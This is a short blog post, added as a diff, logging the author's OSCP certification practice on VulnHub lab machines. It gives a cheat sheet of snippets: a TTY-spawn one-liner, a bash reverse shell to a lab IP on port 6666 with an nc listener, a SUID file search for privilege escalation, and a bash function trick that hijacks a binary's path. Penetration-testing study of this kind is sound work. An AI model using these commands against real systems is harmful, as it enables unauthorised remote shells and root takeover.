@@ -1,0 +1,41 @@
+---
+
+title: 'Path to OSCP - Part 2'
+date: 2016-02-17 03:09:07.000000000 +03:00
+type: post
+published: true
+status: publish
+tags:
+- oscp
+- vuln
+
+---
+<p>Here's the second episode on my path to becoming OSCP certified.</p>
+{% include video id="lAyTP8YNGl4" provider="youtube" %}
+
+<h2>Related links</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/">VulnHub</a></li>
+<li><a href="https://www.vulnhub.com/entry/tr0ll-1,100/">Tr0ll VM </a>which I rooted</li>
+<li><a href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll2 VM</a> which I failed because I didn't think to try shellshock</li>
+<li><a href="https://research.g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/">Great walkthrough</a> from which I learned the nifty trick of bash function name masking a binary (Snippet 1)</li>
+</ul>
+<h2>Snippets</h2>
+<h3>Spawn TTY</h3>
+{% highlight python %}python -c 'import pty;pty.spawn("/bin/bash")'{% endhighlight %}
+<p>Related: <a href="http://unix.stackexchange.com/a/122624/43870">Why do you need tty for sudo</a></p>
+<h3>Redirect bash to tcp socket</h3>
+{% highlight bash %}/bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
+# then at receiver:
+nc -l -n -v -p 6666
+# And wait for incoming bash shell{% endhighlight %}
+<h3>Find SUID/SGUID files for privilege escalation</h3>
+{% highlight bash %}find / -user root -perm -4000 -print 2>/dev/null{% endhighlight %}
+<p>Of course if you can somehow exploit these results, you might get root</p>
+<h3>Hijack a binary's full path in bash to exec your own code</h3>
+{% highlight bash %}$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
+$ export -f /usr/bin/foo
+$ /usr/bin/foo
+It works
+{% endhighlight %}
+<p>Of course you might want this if a SUID bit programing is calling some binary by full path and you cannot alter that binary but want to hijack the execution.</p>
